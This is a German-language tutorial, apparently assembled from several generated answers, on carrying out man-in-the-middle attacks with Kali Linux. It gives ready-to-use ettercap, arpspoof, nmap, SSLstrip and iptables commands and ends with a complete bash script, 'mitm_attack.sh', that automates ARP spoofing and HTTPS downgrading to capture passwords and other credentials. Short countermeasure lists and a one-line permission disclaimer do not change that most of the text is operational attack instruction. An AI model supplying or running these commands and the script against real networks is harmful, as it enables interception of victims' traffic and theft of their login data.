Ziel bei einem solchen Angriff ist es, sich unbemerkt in eine Kommunikation zwischen zwei oder mehreren Partnern einzuschleichen, beispielsweise um Informationen mitzulesen oder zu manipulieren. Hierbei begibt sich der Angreifer "in die Mitte" der Kommunikation,indem er sich gegenüber dem Sender als Empfänger und gegenüber dem Empfänger als Sender ausgibt.



**Schritt-für-Schritt-Anleitung für einen realistischen MitM-Angriff:**

**1. Vorbereitung:**

- **Zielnetzwerk:** Identifizieren Sie das Zielnetzwerk und die Zielgeräte.
- **Angreifergerät:** Ein Laptop oder ein anderes Gerät mit der Fähigkeit, Netzwerkverkehr zu manipulieren.
- **Software:**
    - Wireshark: Zur Erfassung und Analyse von Netzwerkverkehr.
    - Ettercap oder Bettercap: Zur Durchführung von ARP-Spoofing und anderen MitM-Angriffen.
    - SSLstrip oder HSTS-Bypass-Tools: Zum Abfangen von HTTPS-Verbindungen.

**2. ARP-Spoofing:**

- ARP-Spoofing ist eine Technik, bei der der Angreifer falsche ARP-Nachrichten (Address Resolution Protocol) an die Zielgeräte sendet.
- Dadurch wird die MAC-Adresse des Angreifers mit der IP-Adresse des Gateways oder des Zielgeräts verknüpft.
- Der gesamte Netzwerkverkehr der Zielgeräte wird nun über das Angreifergerät geleitet.

**Beispielhafter Ettercap-Befehl für ARP-Spoofing:**

Bash

```
ettercap -T -q -i <Schnittstelle> -M arp:remote /<Ziel-IP>/ /<Gateway-IP>/
```

- `<Schnittstelle>`: Die Netzwerkschnittstelle des Angreifergeräts (z. B. eth0 oder wlan0).
- `<Ziel-IP>`: Die IP-Adresse des Zielgeräts.
- `<Gateway-IP>`: Die IP-Adresse des Gateways.

**3. Datenverkehr abfangen und analysieren:**

- Mit Wireshark kann der gesamte Netzwerkverkehr, der über das Angreifergerät läuft, erfasst und analysiert werden.
- Dadurch können Passwörter, Anmeldeinformationen und andere sensible Daten abgefangen werden.

**4. HTTPS-Downgrade (SSLstrip/HSTS-Bypass):**

- SSLstrip und HSTS-Bypass-Tools ermöglichen es, HTTPS-Verbindungen zu entschlüsseln, indem sie ein Downgrade auf HTTP erzwingen.
- Dadurch können auch verschlüsselte Daten abgefangen werden.

**5. Datenmanipulation (optional):**

- Der Angreifer kann den abgefangenen Datenverkehr verändern, um beispielsweise Schadcode einzuschleusen oder gefälschte Webseiten anzuzeigen.

**Gegenmaßnahmen:**

- Verwendung von VPNs: Verschlüsselt den Datenverkehr und schützt vor MitM-Angriffen.
- Verwendung von HTTPS: Stellt eine verschlüsselte Verbindung zwischen dem Browser und dem Server her.
- Überprüfung von SSL/TLS-Zertifikaten: Stellt sicher, dass die Verbindung mit dem richtigen Server besteht.
- Verwendung von ARP-Spoofing-Erkennungssoftware: Erkennt und blockiert ARP-Spoofing-Angriffe.
- Verwendung von HSTS (HTTP Strict Transport Security): Erzwingt die Verwendung von HTTPS.



**Schritt-für-Schritt-Anleitung für einen MitM-Angriff mit Kali Linux:**

**1. Vorbereitung:**

- **Kali Linux:** Stellen Sie sicher, dass Kali Linux auf Ihrem System installiert ist.
- **Zielnetzwerk:** Identifizieren Sie das Zielnetzwerk und die Zielgeräte.
- **Angreifergerät:** Ein Laptop oder ein anderes Gerät mit einer WLAN-Schnittstelle.
- **Netzwerkadapter:** Eine WLAN-Schnittstelle, die den Monitor-Modus unterstützt (für drahtlose Angriffe).

**2. ARP-Spoofing (für lokale Netzwerke):**

- ARP-Spoofing ist eine Technik, die es ermöglicht, den Datenverkehr zwischen zwei Geräten im lokalen Netzwerk abzufangen.
- Öffnen Sie ein Terminal in Kali Linux.
- Aktivieren Sie das IP-Forwarding, um den Datenverkehr weiterzuleiten:
    - `echo 1 > /proc/sys/net/ipv4/ip_forward`
- Verwenden Sie `arpspoof`, um das Zielgerät und das Gateway zu täuschen:
    - `arpspoof -i <Schnittstelle> -t <Ziel-IP> <Gateway-IP>`
    - `arpspoof -i <Schnittstelle> -t <Gateway-IP> <Ziel-IP>`
    - `<Schnittstelle>`: Die Netzwerkschnittstelle des Angreifergeräts (z. B. eth0 oder wlan0).
    - `<Ziel-IP>`: Die IP-Adresse des Zielgeräts.
    - `<Gateway-IP>`: Die IP-Adresse des Gateways.
- Mit diesem Befehl wird der Angreifer in die Kommunikation zwischen Opfer und Gateway platziert.

**3. Datenverkehr abfangen und analysieren:**

- Verwenden Sie Wireshark, um den abgefangenen Datenverkehr zu analysieren:
    - `wireshark -i <Schnittstelle>`
- Filtern Sie den Datenverkehr nach interessanten Protokollen (z. B. HTTP, FTP, Telnet).

**4. HTTPS-Downgrade (SSLstrip):**

- SSLstrip ist ein Tool, das HTTPS-Verbindungen auf HTTP downgradet.
- Führen Sie SSLstrip aus:
    - `sslstrip -a -l 8080`
- Konfigurieren sie Iptables, damit der Datenverkehr über den SSL-Strip läuft:
    - `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`

**5. Datenmanipulation (optional):**

- Tools wie Bettercap oder mitmproxy, ermöglichen, den abgefangenen Datenverkehr zu verändern, um beispielsweise Schadcode einzuschleusen.

**6. Gegenmaßnahmen:**

- Verwenden Sie VPNs, um den Datenverkehr zu verschlüsseln.
- Überprüfen Sie SSL/TLS-Zertifikate.
- Verwenden Sie HSTS (HTTP Strict Transport Security).
- Verwenden sie Netzwerksicherheitstools, welche ARP-Spoofing und andere MitM-Angriffe erkennen.
- Verwenden Sie kabelgebundene verbindungen.




## Vorbereitung

1. Stellen Sie sicher, dass Kali Linux auf Ihrem System installiert ist.
    
2. Identifizieren Sie das Zielnetzwerk und die Zielgeräte.
    
3. Verwenden Sie ein Gerät mit einer WLAN-Schnittstelle, die den Monitor-Modus unterstützt.
    

## Netzwerk-Scanning

Scannen Sie zunächst das Netzwerk, um Zielgeräte zu identifizieren:

bash

`nmap -sn 192.168.1.0/24`

Notieren Sie sich die IP-Adressen des Zielgeräts und des Gateways.

## ARP-Spoofing

1. Aktivieren Sie IP-Forwarding:
    

bash

`echo 1 > /proc/sys/net/ipv4/ip_forward`

1. Starten Sie ARP-Spoofing mit arpspoof:
    

bash

`arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 arpspoof -i eth0 -t 192.168.1.1 192.168.1.10`

Ersetzen Sie "eth0" durch Ihre Netzwerkschnittstelle, "192.168.1.10" durch die IP des Zielgeräts und "192.168.1.1" durch die IP des Gateways[1](https://journals.indexcopernicus.com/api/file/viewByFileId/641901)[2](https://www.hacking-tutorial.com/hacking-tutorial/kali-linux-man-middle-attack/).

## Datenverkehr abfangen

Verwenden Sie Wireshark, um den Datenverkehr zu analysieren:

bash

`wireshark -i eth0`

Filtern Sie nach relevanten Protokollen wie HTTP oder FTP[6](https://data-flair.training/blogs/network-analysis-with-wireshark-on-kali-linux/).

## HTTPS-Downgrade mit SSLstrip

1. Installieren Sie SSLstrip:
    

bash

`sudo apt-get install sslstrip`

1. Starten Sie SSLstrip:
    

bash

`sslstrip -l 8080`

1. Konfigurieren Sie iptables:
    

bash

`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`

1. Überwachen Sie den Datenverkehr:
    

bash

`tail -f sslstrip.log`

## Beispielskript

Hier ist ein Bash-Skript, das den gesamten Prozess automatisiert:

bash

`#!/bin/bash # Funktion zum Überprüfen der Root-Rechte check_root() {     if [ "$EUID" -ne 0 ]; then        echo "Dieses Skript muss als Root ausgeführt werden."        exit 1    fi } # Funktion zum Aktivieren des IP-Forwarding enable_ip_forwarding() {     echo 1 > /proc/sys/net/ipv4/ip_forward    echo "IP-Forwarding aktiviert." } # Funktion zum Starten des ARP-Spoofing start_arp_spoofing() {     local interface=$1    local target=$2    local gateway=$3     arpspoof -i "$interface" -t "$target" "$gateway" &    arpspoof -i "$interface" -t "$gateway" "$target" &    echo "ARP-Spoofing gestartet." } # Funktion zum Starten von SSLstrip start_sslstrip() {     sslstrip -l 8080 &    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080    echo "SSLstrip gestartet." } # Hauptfunktion main() {     check_root     read -p "Geben Sie die Netzwerkschnittstelle ein (z.B. eth0): " interface    read -p "Geben Sie die IP-Adresse des Zielgeräts ein: " target    read -p "Geben Sie die IP-Adresse des Gateways ein: " gateway     enable_ip_forwarding    start_arp_spoofing "$interface" "$target" "$gateway"    start_sslstrip     echo "MitM-Angriff läuft. Drücken Sie CTRL+C zum Beenden."    tail -f sslstrip.log } # Skript ausführen main`

Speichern Sie dieses Skript als `mitm_attack.sh` und führen Sie es mit Root-Rechten aus:

bash

`sudo bash mitm_attack.sh`

## Wichtige Hinweise

- Verwenden Sie dieses Skript nur in kontrollierten Umgebungen und mit ausdrücklicher Erlaubnis.
    
- MitM-Angriffe können illegal sein und die Privatsphäre verletzen.
    
- Moderne Sicherheitsmaßnahmen wie HSTS können solche Angriffe erschweren[7](https://anovin.mk/tutorial/how-to-use-the-sslstrip-tool-for-https-downgrading-attacks-in-kali-linux/).
    

## Gegenmaßnahmen

1. Verwenden Sie VPNs zur Verschlüsselung des Datenverkehrs.
    
2. Überprüfen Sie SSL/TLS-Zertifikate sorgfältig.
    
3. Aktivieren Sie HSTS auf Webservern.
    
4. Nutzen Sie Netzwerksicherheitstools zur Erkennung von ARP-Spoofing.
    
5. Bevorzugen Sie kabelgebundene Verbindungen in sensiblen Umgebungen